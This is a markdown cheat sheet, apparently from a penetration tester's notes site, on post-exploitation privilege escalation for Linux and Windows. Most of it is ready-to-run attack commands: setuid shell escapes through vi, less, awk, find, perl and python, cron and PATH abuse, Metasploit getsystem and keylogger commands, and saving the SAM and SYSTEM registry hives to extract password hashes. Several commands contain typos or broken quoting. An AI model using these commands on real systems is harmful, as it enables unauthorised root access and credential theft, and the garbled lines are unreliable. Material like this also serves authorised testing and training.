---
title: Priv Esc
category: Post-Exploitation
order: 96
---

>**Linux**

check sudo permissions | <code> sudo -l </code>
check for world writable files | <code> find / -perm -2 ! -tyle l -ls 2>/dev/null </code>
Cron Jobs | <code> cat /etc/crontab <br> #find files with week permisions</code>
Cron.d | Write a file to cron.d and wait for restart
Cron files | <code> ls /etc/cron.hourly/ <br> #can you write to any files </code>
Kernal Exploit | <code>Run uname -a, /etc/release, /etc/issue and find an exploit </code>
Application Exploit | Look for web servers, mail servers for command injection <br> Look for exploits in root owned programs
PATH | Look for '.' in the path for system users
SETUID/SETGUID | <code> find directory -user root -perm -4000 -exec ls -ld {} \; > /tmp/security-hole </code> <br> They may use the system syscall without specifying the path name 
User writable scripts | Look for scripts that have user writable permissions and are invoked by root (or call scripts that are invoked by root)
Enlightenment Exploit Pack | tbd
LD_PRELOAD | [SANS](https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win)

Resources:
* [g0tmilk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [LinEnum](http://www.rebootuser.com/?p=1758)
* [LinuxPrivChecker](http://www.securitysift.com/download/linuxprivchecker.py)


**setuid permissions**
 
{% highlight bash %}

vi:
:shell
:set shell=/bin/bash
:! /bin/bash

less:
(press v - launching vi) :shell

more:
?,  !bash

more,less, man:
'! /bin/sh'
'!/bin/sh'
'!bash'

tee:
echo "evil script code" | tee script.sh

awk:
awk 'BEGIN {system("/bin/sh")}'

find . -exec bash -i \;
find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

perl exec ""/bin/bash"";[ctrl-d]
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";

ruby exec ""bin/bash""
ruby: exec "/bin/sh"

python import os os.system('/in/bash')
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()

lua: os.execute('/bin/sh')

irb(main:001:0> exec "/bin/sh"

nano 
{% endhighlight %}

>**Windows**

Find SMB Version 1 | <code> Get-Item HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters | ForEach-Object {Get-ItemProperty $_.pspath} </code>
Find SMB Version 2/3 | <code> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters | ForEach-Object {Get-ItemProperty $_.pspath} </code>
Find SMB Version 2/3 | <code> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters | ForEach-Object {Get-ItemProperty $_.pspath} </code>
Check installed patches | wmic qfe list full /format:list 
Check Services | <code> wmic service get name,startname,pathname </code>
Check Services | <code> for /F "tokens=2* delims= " %i in ('sc query ^| find /I "ce_name"') do @sc qc %i %j  </code>
Check Scheduled Tasks | <code> schtasks /query /fo list /v </code>
Check Startup | <code> wmic startup list full </code>
Check Permissions on Services, Tasks, and Startup |  <code> icacls executable <br> #look for something like Everyone:(CI)(F) or Users:(CI)(F) </code>
Missing Patches | <code> (New-Object -c Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0").Updates|Select Title </code>
Metasploit | use priv, getsystem -n [number]
Metasploit keylogger | keyscan_start, keyscan_stop, keyscan_dump
Hashed Passwords | <code> reg save HKLM\SAM C:\Windows\Temp\SAM </code>
Hashed Passwords | <code> reg save HKLM\SYSTEM SYSTEM </code>
SAM Locations | c:\windows\repair, c:\winnt\repair
Active Directory Representations | ntd.dit
Run a command as another user | <code> C:\> runas /noprofile /user:domain\username "mmc wf.msc" </code>

http://pentestmonkey.net/uncategorized/from-local-admin-to-domain-admin
https://www.slideshare.net/riyazwalikar/windows-privilege-escalation

>**Mind Map**

[Priv Esc Mind Map](https://binaryexile.github.io/images/privesc.jpg)


